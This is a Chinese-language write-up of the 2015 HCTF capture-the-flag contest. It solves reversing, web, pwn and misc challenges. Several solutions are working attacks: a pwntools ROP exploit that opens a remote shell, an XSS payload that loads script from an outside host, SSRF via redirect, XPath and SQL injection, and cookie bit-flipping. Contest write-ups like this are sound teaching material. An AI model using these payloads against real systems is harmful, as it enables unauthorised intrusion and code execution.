---
layout: post
title: "2015 HCTF Writeup"
tags: [ctf]
author: 0xFA Team
---

* 目录
{:toc}

#HCTF Writeup

###Server is done

　　发现，返回的Message和注释掉的加密过的flag，每次都会变化。再然后发现Message长度和我们post过去的arg参数一样长。猜是流密码，然后post一个老长的arg，用返回的Message与arg异或得到本次加密的密码。再用这个密码异或后面的flag就好了。  
![](http://www.purpleroc.com/MD/hctf/server.jpg)   
 `flag:hctf{D0YOuKnovvhOw7oFxxkRCA?iGuE55UCan...Ah}`

###COMA WHITE

　　把js拖出来看算法和判定。知道有md5和base64，再用alert打印来本地调试，可以得到一些信息，比如输入的flag的长度应该为32，比如32为被split了，有些2位有些1位，再比如，算法把这些分开的部分全部base64了一次，再比如，base64之后再做了一次MD5。  
　　最后，把上面的得到的每个部分的md5连起来与js中的：`var result = "7e56035a736d269ad670f312496a0846d681058e73d892f3a1d085766d2ee0846d0af56bf900c5eeb37caea737059dce0326a0d2fc368284408846b9902a78da2a6039655313bf5dab1e43523b62c3748041613eff4408b9268b66430cf5d9a151f581937765890f2a706c77ea8af3cc06adbb51e161b0f829f5b36050037c6f3d1bc5e8d1a5a239ae77c74b44955fea0326a0d2fc368284408846b9902a78da8870253dbfea526c87a75b682aa5bbc525349a3437406843e62003b61b13571d09eb53a8dfb5c98d741e2226a44480242a6039655313bf5dab1e43523b62c374b81f204316b63919b12b3a1f27319f81af6cdb852ac107524b150b227c2886e6301270f6f62d064378d0f1d73a851973167a3b2baacd621cc223e2793b3fa9d28582d13498fb14c51eba9bc3742b8c2fb8dd7ca5c612a233514549fa9013ef242504501092bb69d0cb68071888c70cec7503666eb57e9ebb9a7bf931c68ac733";`作对比，如果对了，你输入的就是flag。  
　　所以，我们把它逆过来就是，先分片为32字节的md5，然后再去cmd5解密（因为很短，所以都能接），接完后得到base64，再b64decode，而后连接起来。就得到了flag。

###真的很友善的逆向题（福利） 

　　额，本来想一两句话说完的，想想，还是好好写吧。打开没加壳，也能直接ida看到关键算法，不过调试会有些奇怪的问题。
　　恩，运行起来会发现，点不到check按钮，然后就去od对MoveWindow下断，当鼠标移动过去的时候，就断下来了，然后返回到用户空间，得到用户空间地址004018D8。
　　![enter image description here](http://purpleroc.com/md/hctf/re1.jpg)  
　　在IDA里跟随到这个地址，然后找跳转的地方，可以知道是不满足：

    if ( a3 > 0x110 )

　　才跳转的，随意，自然的把00401859处的ja改成jmp，就把按键固定了下来。

    .text:00401859 ja      loc_40

　　本想直接用winhex改下exe，就不用每次调试都改一次，可发现，winhex改完后的确能停下来，但getwindowtexta会出问题，具体，没时间分析。
　　接着看算法吧，先判断长度是否为`22`，再有个check1：
　　做的事情主要是，用程序中写死的`316754`分别减去用户输入的前五个字符和最后一个字符。结果需要为：
　　
    Address   Value      ASCII Comments
    0036F72C  /FFFFFFEB  ????
    0036F730  |FFFFFFEE  ????
    0036F734  |FFFFFFE2  a???
    0036F738  |FFFFFFF1  ????
    0036F73C  |FFFFFFBA  o???
    0036F740  |FFFFFFB7  ·???

　　其实猜都能猜到这个是`HCTF{}`，所以还剩中间16位。
　　再看check2，这里是处理剩下的16位中的前12位，有个算法在里面，静态看似乎比较复杂，直接动态调试，输入`ABCDEFabcdef`得到结果为：

    CPU Dump
    Address   Hex dump                                         ASCII
    012D91C0  00 00 00 00|01 00 00 00|02 00 00 00|04 00 00 00|      
    012D91D0  03 00 00 00|05 00 00 00|06 00 00 00|07 00 00 00|      
    012D91E0  64 00 00 00|65 00 00 00|66 00 00 00|67 00 00 00| d e f g

　　所以可以知道，大概操作是从字母表中找你输入的字符对应的偏移位置。这里就可以弄个对照表出来了。

    dic = {}
    for i in range(26):#A-Z
        dic[i] = chr(i+0x41)
    for i in range(26):#a-z
        dic[i+0x64] = chr(i+0x61)
    for i in range(10):#0-9
        dic[i+0xC8] = chr(i+0x30)

　　完了后再进行置换操作：

    v8 = rere[6];
    rere[6] = rere[0];
    rere[0] = v8;
    v9 = rere[8];
    rere[8] = rere[3];
    rere[3] = v9;
    v10 = rere[5];
    rere[5] = rere[2];
    rere[2] = v10;
    v11 = rere[4];
    rere[4] = rere[11];
    v12 = 0;
    rere[11] = v11;

　　得到的结果，再与程序中写好的：

    .rdata:00415600 code            dd 66h, 64h, 0C8h, 68h, 2 dup(75h), 14h, 0Bh, 68h, 15h, 68h, 12h
	
　　进行一一对比，所以，解密脚本为：

    cipher = [0x66, 0x64, 0x0C8, 0x68, 0x75, 0x75, 0x14, 0x0B, 0x68, 0x15, 0x68, 0x12]
    cipher[0],cipher[6] = cipher[6],cipher[0]
    cipher[3],cipher[8] = cipher[8],cipher[3]
    cipher[5],cipher[2] = cipher[2],cipher[5]
    cipher[11],cipher[4] = cipher[4],cipher[11]
    
    `flag = []`
    `for i in cipher:`
`	flag.append(dic[i])`

　　对，还没完，还有四位：

        while ( 1 )
        {
          v7 = aEa57_0 ^ v02_user;
          if ( (aEa57_0 ^ v02_user) >= 0
            && aEa57_0 != v02_user
            && (v7 ^ (char)v15) == aEa57[0]
            && (v7 ^ SBYTE1(v15)) == aEa57[1]
            && (v7 ^ SBYTE2(v15)) == aEa57[2]
            && (v7 ^ SBYTE3(v15)) == aEa57[3] )
            break;
          Sleep(0x14u);
          ++v6;
          if ( v6 >= 100 )
            goto LABEL_28;
        }

　　这个地方用od动态调的话，就是个坑，然而，静态吧：

        if ( v7 == 2 )
        {
          MessageBoxW(0, L"YOU GOT IT", L"OK", 0);
          exit(0);
        }

　　就是，用`0x02`去异或程序中写死的一段数据`Ea57`，所以，结合起来的解密脚本是：

    #!/usr/bin/env python
    # -*- coding: utf-8 -*-
    __Url__ = 'Http://www.purpleroc.com'
    __author__ = 'Tracy_梓朋'
                                                                
    cipher = [0x66, 0x64, 0x0C8, 0x68, 0x75, 0x75, 0x14, 0x0B, 0x68, 0x15, 0x68, 0x12]
    data = 'Ea57'
    dic = {}
    for i in range(26):#A-Z
        dic[i] = chr(i+0x41)
    for i in range(26):#a-z
        dic[i+0x64] = chr(i+0x61)
    for i in range(10):#0-9
        dic[i+0xC8] = chr(i+0x30)
     
    cipher[0],cipher[6] = cipher[6],cipher[0]
    cipher[3],cipher[8] = cipher[8],cipher[3]
    cipher[5],cipher[2] = cipher[2],cipher[5]
    cipher[11],cipher[4] = cipher[4],cipher[11]
                                                      
    flag = []
    for i in cipher:
        flag.append(dic[i])
    for i in data:
        flag.append(chr(ord(i) ^ 0x02))
                                                    
    print "flag is: HCTF{" + "".join(flag) + "}"

`flag is: HCTF{UareS0cLeVerGc75}`

###欧洲人的游戏（你是欧洲人吗？） 
　　被无脑的16位程序折腾了半天后，看到32位还是挺亲切的，而且，代码看起来也挺亲切：

      GetDlgItemTextA(hWnd, 1001, &String, 41);
      if ( sub_401190(&String) )
      {
        wsprintfA(&Text, "hctf{\%s}", &String);
        MessageBoxA(hWnd, &Text, "Right", 0);
      }

　　从sub_401190如下：

    v1 = this;
    len = this;
    v3 = (char *)this + 1;
    do
    {
        v4 = *(_BYTE *)len;
        len = (char *)len + 1;
    }
    while ( v4 );
    result = 0;
    if ( (_BYTE *)len - v3 == 20 )
    {
      while ( data[result] == (*((_BYTE *)v1 + result + 10) ^ 7) )
    {
      ++result;
      if ( result >= 10 )
      {
        data1[0] = *(_BYTE *)v1;
        data1[17] = *((_BYTE *)v1 + 1);
        data1[34] = *((_BYTE *)v1 + 2);
        data1[51] = *((_BYTE *)v1 + 3);
        data1[68] = *((_BYTE *)v1 + 4);
        data1[85] = *((_BYTE *)v1 + 5);
        data1[102] = *((_BYTE *)v1 + 6);
        data1[119] = *((_BYTE *)v1 + 7);
        data1[136] = *((_BYTE *)v1 + 8);
        v6 = *((_BYTE *)v1 + 9);
        v7 = -1;
        v8 = -1;
        data1[153] = v6;
        v9 = 0;
        do
        {
          v8 = data2[2 * (unsigned __int8)(v8 ^ data1[v9 + 1]) + 1] ^ ((unsigned int)v8 >> 8);
          v7 = data2[2 * (unsigned __int8)(v7 ^ data1[v9])] ^ ((unsigned int)v7 >> 8);
          v9 += 2;
        }
        while ( v9 < 256 );
        v10 = ~v8;
        if ( ~v7 == 0x22082EE2 && v10 == 0xC7C2B0FE )
          return 1;
        break;
      }
    }
    result = 0;
    }
    return result;
    }

　　首先长度要为20字节，而后一个简单的异或与写死的data比较。所以，后十位是：

    data = "~'`7Hc6410"
    flag = []
    for i in data:
        flag.append(chr(ord(i) ^ 0x7))

　　然而，剩下一个，两个表，各种查表异或，最后比较的，发现，推不回去，就只能爆破了，给力安卓牛写的爆破代码（取关键部分，两个table太长了）：

    void do_do(int *ret1, int *ret2){
        int ret = 0;
        int *dword_40BEC0 = (int*)data2;
        // int *dword_40BEC4 = (int*)(data2 + 4);
        unsigned int v5 = -1;
        unsigned int v6 = -1;
        int v7 = 0;
                        
        v7 = 0;
        do
        {
                // v5 = dword_40BEC0[2 * (unsigned char)(v5 ^ data1[v7])] ^ (v5 >> 8);
                // v6 = dword_40BEC4[2 * (unsigned char)(v6 ^ data1[v7 + 1])] ^ (v6 >> 8);
                v6 = dword_40BEC0[2 * (unsigned char)(v6 ^ data1[v7 + 1]) + 1] ^ (v6 >> 8);
                v5 = dword_40BEC0[2 * (unsigned char)(v5 ^ data1[v7])] ^ (v5 >> 8);
                v7 += 2;
        }
        while ( v7 < 256 );
        *ret1 = v5;
        *ret2 = v6;
    }


    int main(){
    int i, j, k, l, m;
    int ret1, ret2;
    int flag = 0;
                
    for(i = 32; i < 127; i++){
        data1[16 * 0 + 0] = i & 0xFF;
        data1[16 * 1 + 1] = i & 0xFF;
    	for(j = 32; j < 127; j++){
    	    data1[16 * 2 + 2] = j & 0xFF;
    	    data1[16 * 3 + 3] = j & 0xFF;
    	    for(k = 32; k < 127; k++){
    		data1[16 * 4 + 4] = k & 0xFF;
                data1[16 * 5 + 5] = k & 0xFF;
    		for(l = 32; l < 127; l++){
                    data1[16 * 6 + 6] = l & 0xFF;
                    data1[16 * 7 + 7] = l & 0xFF;
                    for(m = 32; m < 127; m++){
    			data1[16 * 8 + 8] = m & 0xFF;
                        data1[16 * 9 + 9] = m & 0xFF;
    			do_do(&ret1, &ret2);
    			if(ret1 == ~0x22082EE2){
    				printf("偶数：%c%c%c%c%c\n", i, j, k, l, m);
    			}
    			if(ret2 == ~0xC7C2B0FE){
    				printf("奇数：%c%c%c%c%c\n", i, j, k, l, m);
    			}
    		   }
    			}
    		}
    	}
        }
    }

　　最后得到的奇数和偶数组数挺多，也就是有多解，问了主办方，对方表示~以为多解的几率不大~对，以为。然后就组出flag了，

    奇数：+'Gdy
    奇数：1 svr
    偶数：:^?,i
    偶数：NYJ}/
    偶数：cc1 3
    偶数：s,}O#
    奇数：~h5!E

　　猜flag是：`hctf{c1c 1s v3ry g0Od1367}`
　　
###BrainFuck 
　　想对出题人说的话（见题目描述）。
　　好吧，正经点，ida看了看，意思是，根据你输入的：
　　`',[]-+><`
　　这些里面的一些符号，找到对应的代码：

    .rodata:0000000000400AE8 aPtr_0          db ' ++ptr; ',0         ; DATA XREF: .data:cmd1o
    .rodata:0000000000400AF1 aPtr_1          db ' --ptr; ',0         ; DATA XREF: .data:cmd2o
    .rodata:0000000000400AFA aPtr            db ' ++*ptr; ',0        ; DATA XREF: .data:cmd3o
    .rodata:0000000000400B04 aPtr_2          db ' --*ptr; ',0        ; DATA XREF: .data:cmd4o
    .rodata:0000000000400B0E aPutcharPtr     db ' putchar(*ptr); ',0 ; DATA XREF: .data:cmd5o
    .rodata:0000000000400B1F aPtrGetchar     db ' *ptr =getchar(); ',0 ; DATA XREF: .data:cmd6o
    .rodata:0000000000400B32 aWhilePtr       db ' while (*ptr) { ',0 ; DATA XREF: .data:cmd7o
    .rodata:0000000000400B43 asc_400B43      db ' } ',0  

　　组合起来，在编译成另外一个elf，完了再执行它，意思就是，我给你的主程序没问题，你自己用上面的代码，写个程序，完了再溢出它，对，编译也是在远端。很多不可控需要探测的因素。
　　文件头给出了：

    #include <stdlib.h>
    #include <stdlib.h>
    int main(void) 
    {
    	setbuf(stdin,0); 
    	char code[0x200]; 
    	char *ptr = code;
    
　　最开始考虑的是，能否构造leak，因为只有leak出了栈上面的信息才能慢慢摸索服务端的不可控因素。这时候，安卓牛就开始画栈结构了~
　　开辟的256字节空间的code是在栈上的，ptr是放在code下面的，里面存的是code的地址。
　　![enter image description here](http://purpleroc.com/md/hctf/s2.jpg)
　　那我怎么才能leak出栈上面的信息呢？

    --*ptr; 
    putchar(*ptr);

　　一直这样下去似乎可行，而且，读到256字节需要传入512行代码，而可传入的代码顶多255行。用个while也不行，因为，不可控制退出，那leak到的东西也用不上。
　　于是，机智的写了下面的代码：

    *ptr =getchar();
    while (*ptr) {
    	++ptr;
    	*ptr =getchar();
    }
    
　　可以实现用`\x00`退出循环，并且控制ptr的值。ptr上有用的信息都是在code区间之后，那leak的信息也应该先写满code，再读取堆栈。于是，上面的代码再加上几句：

    putchar(*ptr);  
    ++ptr;

　　就能得到信息了，而且，你会发现整个程序都只有一个main函数，那再进main函数的时候，肯定会往栈上放一个ret地址，我们找到ret地址，然后用getchar()可以控制eip。于是，关键就是怎么获取到system地址，怎么获取到libc地址。
　　在调试的时候，发现，main的返回地址是`__libc_start_main`里的，意味着，其实程序是ret到libc上的，那拿到这个地址就可以算出`system()`地址，`/bin/sh`地址了。然后找个rop链，让rdi指向`/bin/sh`（tm好久没玩pwn，给记成x86的压栈传参了，然后坑了好久~），就可以getshell了。
　　exp如下

    #!/usr/bin/env python
    # -*- coding: utf-8 -*-
    __Url__ = 'Http://www.purpleroc.com'
    __author__ = 'Tracy_梓朋'
               
    from pwn import *
    import pwnlib 
                
    p = remote("120.55.86.95", 22222)
    elf = ELF('./pwn2')
    #libc = ELF("./libc.64.so")
    libc = ELF("./libc.so.64")
                    
    #p = process("./brainFuckCode")
    token = "acc6ae0297b7c75f0ad51f392da9d42f"
    #rp = remote("120.55.86.95", 22222)
                    
    p.recvuntil("TOKEN=")
    p.send(token + '\n')
    readany = ",[>,].>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>.>" + '<'*8  + ',>' * 40  + "]q"
    p.send(readany + '\n')
    print p.recv()
                
    payload = "1"*(0x200 - 4) + "\x00"*1 + '\n'
    #time.sleep(20)
    p.send(payload)
    #pwnlib.gdb.attach(p)
                    
    buf = p.recv()
    x = open("out.data", 'wb')
    x.write(buf)
                
    for i in range(4):
        #print buf[i*8 : (i + 1) * 8 ]
        print hex(u64(buf[i*8 : (i + 1) * 8]))
            
    buf = buf[2:]
    buf += '\x00'
            
    addr = u64(buf[3*8 + 1: (3+ 1) * 8 + 1])
    print "addr:" + hex(addr)
    main_addr = u64(buf[3*8 +1: (3+ 1) * 8 + 1]) - 245
    print  "main: " + hex(main_addr)
                
    off_main_sys = libc.symbols['system'] - libc.symbols['__libc_start_main'] 
    off_main_bin = next(libc.search('/bin/sh')) - libc.symbols['__libc_start_main']
                        
    system_addr = main_addr + off_main_sys
    bin_addr = main_addr + off_main_bin
                        
    print "system: " + hex(system_addr)
    print  "/bin/sh:" + hex(bin_addr)
                    
    off_rop = 0xfa479 - 0x21ec5
    rop_addr = addr + off_rop
                   
    p.send(p64(rop_addr) + p64(system_addr) + p64(bin_addr) + '\x00'*16 + '\n')
    p.interactive()

　　还有个坑就是，你敲得回车键会算一个字符压栈~
　　![enter image description here](http://purpleroc.com/md/hctf/exp.png)


### Andy
jeb 查看apk, 找到最终比较的key：SRlhb700YZHKvlTrNrt008F=DX3cdD3txmg。

找到核心函数Andy

    public String andy() {
        this.reverse = new Reverse(this.input + "hdu1s8");
        this.encrypt = new Encrypt(this.reverse.make());
        this.classical = new Classical(this.encrypt.make());
        return this.classical.make();
    }
    
首先，编写Classical.make逆方法。

    private String decode(String input){
        String array1 = "0 1 2 3 4 5 6 7 8 9 a b c d e f g h i j k l m n o p q r s t u v w x y z = A B C D E F G H I J K L M E O P Q R S T U V W X Y Z";
        String array2 = "W,p,X,4,5,B,q,A,6,a,V,3,r,b,U,s,E,d,C,c,D,0,t,T,Y,v,9,Q,2,e,8,P,f,h,J,N,g,u,K,k,H,x,L,w,R,I,j,i,y,l,m,S,M,1,0,O,n,2,G,7,=,F,Z";
        String[] v1 = array1.split(" ");
        String[] v2 = array2.split(",");
        
        String t1 = "";
        
        for (int i = 0; i < input.length(); i++) {
            String v0 = String.valueOf(input.charAt(i));
            int v5;
            
            for(v5 = 0; v5 < 63; ++v5) {
                if(v0.equals(v2[v5])) {
                    t1 = i == 0 ? v1[v5]: t1 + v1[v5];
                }
            }
        }
        return t1;
       }

由于Array1和Array2存在重复字串，故需要对逆算之后得到的值进行修正，得到：
`OHMxdWloZDBpMnczcmluYXk2bjhkbmE=`

接着，base64解码数据。`8s1udhd0i2w3rdnay6n8dna`

最后，将字符串逆序，得到：`and8n6yandr3w2i0dhdu1s8`。flag即：`hctf{and8n6yandr3w2i0d}`

###injection 

http://120.26.93.115:24317/0311d4a262979e312e1d4d2556581509/index.php
hint: user=user1 Xpath注入

学习链接 http://www.w3school.com.cn/xpath
猜测查询语句为/*[1]/user[user='user1']
```
//* 	选取文档中的所有元素。
| 	计算两个节点集 	//book | //cd 	返回所有拥有 book 和 cd 元素的节点集
```
根据链接可以拼凑一个语句来查询所有元素
payload
```
http://120.26.93.115:24317/0311d4a262979e312e1d4d2556581509/index.php?user=user1%27]|//*|ss[%27
```
flag
**hctf{Dd0g_fac3_t0_k3yboard233}**


###Personal blog 

访问了http://404.hack123.pw 发现是静态Blog 
![](http://purpleroc.com/md/hctf/blog.png)
看到了澳大利亚的国旗。。 想到了这是不是gitpage搭建的Blog(自己blog也是搭在gitpage上。。)
访问了404.hack123.pw/CNAME 验证了想法
直接去github搜404.hack123.pw 在gitpage项目里有个here is f10g.html
base64decode一下 getflag

**hctf{H3xo_B1og_Is_Niu8i_B1og}**

###Fuck ===

    if (isset($_GET['a']) and isset($_GET['b'])) {
        if ($_GET['a'] != $_GET['b'])
    	    if (md5($_GET['a']) === md5($_GET['b']))
        	die('Flag: '.$flag);
    else
        print 'Wrong.';


php md5函数只对字符串进行加密
如果传入数组的话 返回NULL

payload
```
http://120.26.93.115:18476/eff52083c4d43ad45cc8d6cd17ba13a1/index.php?a[]=123&b[]=33
```
Flag: **hctf{dd0g_fjdks4r3wrkq7jl}**

###404

访问
http://120.26.93.115:12340/3d9d48dc016f0417558ff26d82ec13cc/webI.php
看一下http herader就发现flag了

**hctf{w3lcome_t0_hc7f_f4f4f4}**


###Hack my net 
http://120.26.224.102:25045/ea57f09ea421245047b86eaba834fae1/?u=http://nohackair.net:80/usr/themes/trapecho/css/bootstrap-responsive.min.css

看u可以发送 简单测试了一下命令执行和任意文件读取发现行不通 觉得是SSRF
利用
http://120.26.224.102:25045/ea57f09ea421245047b86eaba834fae1/?u=http://nohackair.net:80@youip/1.css
可以成功访问  
但是请求自己本地用SimpleHTTPServer搭建的web服务器下的1.css还是提示501 自己本地curl了两个文件差别
发现Content-Type不同 所以猜测探测的是Content-Type 
而在请求的时候HTTP头有个提示Config http://localareanet/all.conf 
而之前测试发现服务器也支持跳转 本地写了个php 成功geflag

    <?php
    header('Content-Type:text/css');
    header('Location:http://localareanet/all.conf');


**description:hctf{302_IS_GOOD_TO_SSRF}**

###Easy Xss
简单测试了一下 发现debug处没有过滤 
http://120.26.224.102:54250/0e7d4f3f7e0b6c0f4f6d1cd424732ec5/?errmsg=a&t=2&debug=%27;alert%281%29//

有长度限制 去掉了';还可以输入10个字符
而errormsg变量是可控的 所以打算通过异常来输出errormsg
所以通过定义$变量来让try里面语句出错 从而执行document.write(errormsg);
errormsg过滤了一些字符 但是问题不大可以通过一些常见方式来绕过 比如unescape

payload 

    http://120.26.224.102:54250/0e7d4f3f7e0b6c0f4f6d1cd424732ec5/?errmsg=%3Cimg%20src=x%20onerror=s=createElement%28%27script%27%29;body.appendChild%28s%29;s.src=%27http:%27%2bunescape%28%27%252F%252F%27%29%2b%27t.cn%27%2bunescape%28%27%252F%27%29%2B%27R4vcES2%27;%3E%20&t=1&debug=%27;var%20$=%27


flag:**JAVASCRIPT_DRIVES_ME_CREAZY_BUT_YOU_GOODJB**


###confuse question
login.txt

    parse_str($loginStr,$loginStr);
    foreach($loginStr as $n => $v){
        $v = addslashesForEvery($v);
    	if($n === 'admin'){
    		$username = $v['username'];
                $password = addslashesForEvery($_POST['password']);
    		$sql = "select * from admin where username = '$username' and password = '$password'";
    

parse_str可以进行一次urldecode 而浏览器也能进行一次urldecode
传入%2561%2564%256d%2569%256e 经过parse_str处理就能让绕过替换达成$n=admin的条件
脚本进行了全局的过滤 但是$username取了$v['username']
如果我们传入的$v是个字符串不是数组 那么$v['username']=$v[0]取第一个字符(php真6:))
那么全局过滤 单引号变成了\'取第一个字符\就能闭合username后面的引号 注入get！

payload :
![](http://purpleroc.com/md/hctf/web1.png)

###MC服务器租售中心-1
mc.hack123.pw

查看源代码获取了几个网址

    http://mc.hack123.pw/bbs/
    http://shop.hack123.pw
    http://mcblog.hack123.pw
    http://kirie.hack123.pw

http://kirie.hack123.pw/page/13/ 有个文章需要密码访问  密码123456

    管理地址mc4dm1n.hack123.pw
    主管说不要用自己的生日做密码。。我还没改怎么办。。

http://kirie.hack123.pw/archives/4/ 一张动车票
![](http://purpleroc.com/md/hctf/mc.png)
帐号kirie 密码19940518登录管理地址

登录成功后有一个手机验证的界面
![](http://purpleroc.com/md/hctf/mc2.png)
debug信息泄漏短信验证码
登录后提示

	<!-- Debug信息，调试完成后记得删除 -->
	<!-- Cookie信息 -->
	<!-- {"username":"xxxx","level":"99"} -->
	<!-- 坐看楼上大神写代码 -->
	<!-- 你这数据脱敏跟没脱一样啊！！快点删掉啊！ -->

查看cookie ht固定不变

    hb5TnsUzD+UmXhUb67ulTCaMYRahyjBN9ydGn6LNOes=

解不出来 猜测bit fip
写了个脚本跑了一下 测试到第5个成功了

    import base64
    cipher = "hb5TnsUzD+UmXhUb67ulTCaMYRahyjBN9ydGn6LNOes="
    cc = base64.b64decode(cipher)
                
    for i in range(10):
    sss = list(cc)
    for j in range(10):
        sss[28] = chr(ord(cc[28]) ^ ord('9') ^ ord(str(i)))
        sss[29] = chr(ord(cc[29]) ^ ord('9') ^ ord(str(j)))
        print base64.b64encode("".join(sss))

![](http://purpleroc.com/md/hctf/mc3.png)

###What Is This
http://120.26.60.159/WhatIsThis/what-is-this.1d9bb46782a411bdb72ac82590539826
下载下来用模拟器打开。。 是赤色要塞 而且无限条命 大家拼命一直冲就行了。。
通关记得最大化截屏。。
![](http://purpleroc.com/md/hctf/misc1.png)
虽然被飞机遮住了 但是看到FUCK＊OU 很容易想到FUCKYOU...
flag
**ILOVENESFUCKYOUHCGORSA**


###送分要不要？（萌新点我）
http://120.26.60.159/Andy/Andy.apk.f1bc4dcb815253922a6746316890c05e
用hex编辑器直接打开压缩包。。 在图片开头处有一串奇怪字符串。。
![](http://purpleroc.com/md/hctf/misc2.png)
base64+base32+hex..
![](http://purpleroc.com/md/hctf/misc3.png)
Flag
**hctf{nn1sc_ls_s0_34sy!}**

###RedefCalc(PPC)
nc 120.55.113.21 4799

开始给了四位数的两组样本：

3*8+11+4 
15+3*8-7

由开始提示的一组三位样本，首先想到的是运算符的优先级。分别将+，-，*的优先级分开，优先级如下：

    *  +  -
    *  -  +
    +  -  *
    +  *  -
    -  +  *
    -  *  +

但是这样算出的数据只有15+3*8-7符合，而3*8+11+4经过了一番挣扎。想到把每个运算符都考虑成单独的，分别做先后运算，如下：

    ((15+3)*8)-7
    (15+(3*8))-7
    15+((3*8)-7)
    15+(3*(8-7))
    ((15+3)*(8-7)) //+ - *
    ((15+3)*(8-7)) //- + *


通过以后验算给的六位样本

6[2,5,10,9,3,34]++*-*
得到159001通过。

代码如下

    #coding=utf8
    import socket
    import sys
    import os
    import re
    import zio
    host="120.55.113.21"
    port=4799
    xx=1
    lennnn = 1024
    cmd=""
    r1=re.compile('\d+\[\d+(,\s*\d+)+\](-|\+|\*)+')
    r2=re.compile('\d+\[\d+(,\s*\d+)+\](-|\+|\*)+')
    io=zio.zio((host,port),timeout=20000)
    while 1:
        data=io.read_until_timeout(1)
        if xx==1:
            io.write("acc6ae0297b7c75f0ad51f392da9d42f"+"\n")
            data=io.read_until_timeout(1)
            xx+=1
        if xx==2:
            io.write("\n")
            data=io.read_until_timeout(1)
            xx+=1
        if xx==3:
            io.write("31\n")
            data=io.read_until_timeout(1)
            xx+=1
        if "6+7*8" in data:
            io.write("166\n")
        elif "1*2+3" in data:
            io.write("10\n")
        elif "3*8+11+4" in data:
            io.write("316\n")
        elif "4-3+7" in data:
            io.write("2\n")
        elif "9*3-5" in data:
            io.write("4\n")
        elif "15+3*8-7" in data:
            io.write("255\n")
        else:
            io.write("159001\n")
            data=io.read_until_timeout(1)
            cmd="xel"
        if(cmd=="xel"):
            io.write("999999997\n")
            while 1:
                data=io.read_until("]")
                data+=io.read_until("\n")
                fu = data.split("\n")[-2].strip()
                ff = os.popen("./ppc \""+fu+"\"")  //调用c++
                cdf=ff.read()
                io.write(cdf)
    s.close()


ppc.cpp

    #include <stdio.h>
    #include <string.h>
    #include <algorithm>
    #include <iostream>
    #include <sstream>
    #include <vector>
    #include <queue>
    #include <cmath>
    using namespace std;
    #define INF 0x3fffffff
    #define maxn 1000
                                        
    typedef long long LL;
    const LL MOD = 1e9+7;
        
    LL A[maxn], C[maxn][maxn];
    char op[maxn];
    LL dp[maxn][maxn];
                    
    int main(int nnnnn,char* args[])
    {
        int n;char ch;
        A[0] = 1;
        for(int i=1; i<=maxn-10; i++)
            A[i] = (A[i-1] * i)%MOD;
            C[0][0] = 1;
            for(int i=1; i<=maxn-10; i++)
            {
                C[i][0] = 1;
                for(int j=1; j<=i; j++)
                C[i][j] = (C[i-1][j-1] + C[i-1][j])%MOD;
            }
            stringstream ss(args[1]);
            ss >> n >> ch;
            {
                memset(dp, 0, sizeof(dp));
                for(int i=1; i<=n; i++)
                    ss >> dp[i][i] >> ch;
                    ss >> op+1;
                for(int L=2; L <= n; L++)
                {
                for(int i=1; i+L-1 <= n; i++)
                {
                int j = i + L - 1;
                dp[i][j] = 0;
                for(int k=i; k<j; k++)
                {
                    LL t;
                    if(op[k] == '*')
                    t = (dp[i][k] * dp[k+1][j])%MOD;
                    if(op[k] == '+')
                    t = (dp[i][k]*A[j-k-1] + dp[k+1][j]*A[k-i])%MOD;
                    if(op[k] == '-')
                    t = (dp[i][k]*A[j-k-1] - dp[k+1][j]*A[k-i])%MOD;
                    dp[i][j] = (dp[i][j] + t * C[j-i-1][k-i])%MOD;
                }
                }
                }
                printf("%lld\n", (dp[1][n]+MOD)%MOD );
                }
                return 0;
    }


![](http://purpleroc.com/md/hctf/ppc.png)

flag
**hctf{672cb40bfc5df1527f3a5ea5d1b3e348}**

